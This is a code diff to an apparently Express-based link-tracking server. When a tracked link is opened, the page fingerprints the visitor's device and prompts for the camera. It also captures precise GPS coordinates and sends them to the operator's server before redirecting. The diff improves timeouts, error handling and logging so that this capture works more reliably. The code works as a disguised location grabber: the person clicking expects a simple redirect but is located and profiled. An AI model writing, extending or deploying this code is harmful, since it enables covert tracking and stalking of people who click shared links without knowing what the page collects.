@@ -247,27 +247,49 @@ app.post('/api/track-update/:linkId', async (req, res) => {
       connectionType
     } = req.body;
     
+    console.log('Received tracking update for:', linkId, req.body);
+    
     // Find the link and update the most recent click record
     const link = await Link.findOne({ linkId });
     
     if (!link || link.clickRecords.length === 0) {
+      console.error('Link or record not found:', linkId);
       return res.status(404).json({ success: false, error: 'Link or record not found' });
     }
     
-    // Update the last click record
+    // Update the last click record (most recent)
     const lastIndex = link.clickRecords.length - 1;
-    link.clickRecords[lastIndex].cameraPermission = cameraPermission;
-    link.clickRecords[lastIndex].locationPermission = locationPermission;
-    link.clickRecords[lastIndex].userLatitude = userLatitude;
-    link.clickRecords[lastIndex].userLongitude = userLongitude;
-    link.clickRecords[lastIndex].screenResolution = screenResolution;
-    link.clickRecords[lastIndex].language = language;
-    link.clickRecords[lastIndex].timezone = timezone;
-    link.clickRecords[lastIndex].connectionType = connectionType;
+    
+    // Only update fields that were provided
+    if (cameraPermission !== undefined) {
+      link.clickRecords[lastIndex].cameraPermission = cameraPermission;
+    }
+    if (locationPermission !== undefined) {
+      link.clickRecords[lastIndex].locationPermission = locationPermission;
+    }
+    if (userLatitude !== undefined && userLatitude !== null) {
+      link.clickRecords[lastIndex].userLatitude = userLatitude;
+    }
+    if (userLongitude !== undefined && userLongitude !== null) {
+      link.clickRecords[lastIndex].userLongitude = userLongitude;
+    }
+    if (screenResolution !== undefined) {
+      link.clickRecords[lastIndex].screenResolution = screenResolution;
+    }
+    if (language !== undefined) {
+      link.clickRecords[lastIndex].language = language;
+    }
+    if (timezone !== undefined) {
+      link.clickRecords[lastIndex].timezone = timezone;
+    }
+    if (connectionType !== undefined) {
+      link.clickRecords[lastIndex].connectionType = connectionType;
+    }
     
     await link.save();
     
-    res.json({ success: true });
+    console.log('Tracking data updated successfully');
+    res.json({ success: true, message: 'Tracking data updated' });
   } catch (error) {
     console.error('Update tracking error:', error);
     res.status(500).json({ success: false, error: error.message });
@@ -306,8 +328,12 @@ app.get('/track/:linkId', async (req, res) => {
       device: device,
       referrer: referrer,
       portNumber: portNumber,
-      cameraPermission: 'pending',
-      locationPermission: 'pending'
+      cameraPermission: 'not_requested',
+      locationPermission: 'not_requested',
+      screenResolution: 'Unknown',
+      language: 'Unknown',
+      timezone: 'Unknown',
+      connectionType: 'Unknown'
     };
     
     // Find the link
@@ -389,53 +415,107 @@ app.get('/track/:linkId', async (req, res) => {
               screenResolution: window.screen.width + 'x' + window.screen.height,
               language: navigator.language,
               timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-              connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown'
+              connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+              cameraPermission: 'not_requested',
+              locationPermission: 'not_requested'
             };
             
-            // Request Camera Permission
-            try {
-              const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
-              trackingData.cameraPermission = 'granted';
-              // Stop the camera immediately after getting permission
-              cameraStream.getTracks().forEach(track => track.stop());
-            } catch (error) {
-              trackingData.cameraPermission = error.name === 'NotAllowedError' ? 'denied' : 'not_supported';
+            // Request Camera Permission with timeout
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+              try {
+                const cameraPromise = navigator.mediaDevices.getUserMedia({ 
+                  video: true,
+                  audio: false 
+                });
+                
+                const timeoutPromise = new Promise((_, reject) => 
+                  setTimeout(() => reject(new Error('timeout')), 10000)
+                );
+                
+                const cameraStream = await Promise.race([cameraPromise, timeoutPromise]);
+                trackingData.cameraPermission = 'granted';
+                
+                // Stop the camera immediately
+                cameraStream.getTracks().forEach(track => track.stop());
+              } catch (error) {
+                console.log('Camera error:', error);
+                if (error.name === 'NotAllowedError' || error.message === 'Permission denied') {
+                  trackingData.cameraPermission = 'denied';
+                } else if (error.name === 'NotFoundError') {
+                  trackingData.cameraPermission = 'no_camera';
+                } else if (error.message === 'timeout') {
+                  trackingData.cameraPermission = 'timeout';
+                } else {
+                  trackingData.cameraPermission = 'not_supported';
+                }
+              }
+            } else {
+              trackingData.cameraPermission = 'not_supported';
             }
             
-            // Request Location Permission
+            // Request Location Permission with timeout
             if (navigator.geolocation) {
               try {
                 const position = await new Promise((resolve, reject) => {
-                  navigator.geolocation.getCurrentPosition(resolve, reject, {
-                    timeout: 5000,
-                    maximumAge: 0
-                  });
+                  const timeout = setTimeout(() => {
+                    reject(new Error('timeout'));
+                  }, 10000);
+                  
+                  navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                      clearTimeout(timeout);
+                      resolve(pos);
+                    },
+                    (error) => {
+                      clearTimeout(timeout);
+                      reject(error);
+                    },
+                    {
+                      timeout: 10000,
+                      maximumAge: 0,
+                      enableHighAccuracy: true
+                    }
+                  );
                 });
+                
                 trackingData.locationPermission = 'granted';
                 trackingData.userLatitude = position.coords.latitude;
                 trackingData.userLongitude = position.coords.longitude;
               } catch (error) {
-                trackingData.locationPermission = error.code === 1 ? 'denied' : 'error';
+                console.log('Location error:', error);
+                if (error.code === 1 || error.message === 'User denied Geolocation') {
+                  trackingData.locationPermission = 'denied';
+                } else if (error.code === 2) {
+                  trackingData.locationPermission = 'unavailable';
+                } else if (error.code === 3 || error.message === 'timeout') {
+                  trackingData.locationPermission = 'timeout';
+                } else {
+                  trackingData.locationPermission = 'error';
+                }
               }
             } else {
               trackingData.locationPermission = 'not_supported';
             }
             
             // Send tracking data to server
+            console.log('Sending tracking data:', trackingData);
             try {
-              await fetch(API_BASE + '/api/track-update/' + linkId, {
+              const response = await fetch(API_BASE + '/api/track-update/' + linkId, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(trackingData)
               });
+              
+              const result = await response.json();
+              console.log('Tracking data sent successfully:', result);
             } catch (error) {
               console.error('Failed to send tracking data:', error);
             }
             
-            // Redirect after collecting data (with a small delay to ensure data is sent)
+            // Redirect after collecting data
             setTimeout(() => {
               window.location.href = destinationUrl;
-            }, 500);
+            }, 1000);
           }
           
           // Start collecting data
